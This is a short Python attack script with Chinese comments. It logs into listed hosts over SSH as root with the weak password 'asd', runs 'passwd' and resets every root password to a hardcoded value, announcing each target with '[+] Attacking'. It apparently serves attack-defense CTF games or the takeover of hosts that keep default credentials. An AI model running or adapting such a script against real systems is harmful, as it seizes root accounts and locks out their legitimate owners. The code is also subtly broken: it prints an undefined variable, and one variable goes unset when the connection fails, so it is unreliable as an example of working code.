# -*- coding:utf-8 -*-
import paramiko
### 格式：ip 端口 用户名 密码 ###
###   空格分隔，每行一条数据  ###
users='''
192.168.137.132 22 root asd
192.168.137.129 22 root asd

'''
# ssh 用户名 密码 登陆
def ssh_base_pwd(ip, port, username, password, new_password):
    port = int(port)
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, port=port, username=username, password=password)
        stdin, stdout, stderr = ssh.exec_command("passwd")
        stdin.write(new_password + '\n' + new_password + '\n') #\n模拟回车键
        outresult = stdout.read().decode()
        errresult = stderr.read().decode()
    except Exception as e:
        print(e)
    if('success' in errresult or '成功' in errresult):
        print(ip,'更改成功')
        return True
    if not outresult:
        print("无结果!")
    else:
        print(result.decode())
    ssh.close()
    return True

new_password = 'cbase857857'
lines=users.split('\n')
for line in lines:
    if(line != ''):
        ip,port,username,password=line.split(' ')
        print("[+] Attacking " + ip)
        ssh_base_pwd(ip, port, username, password, new_password)
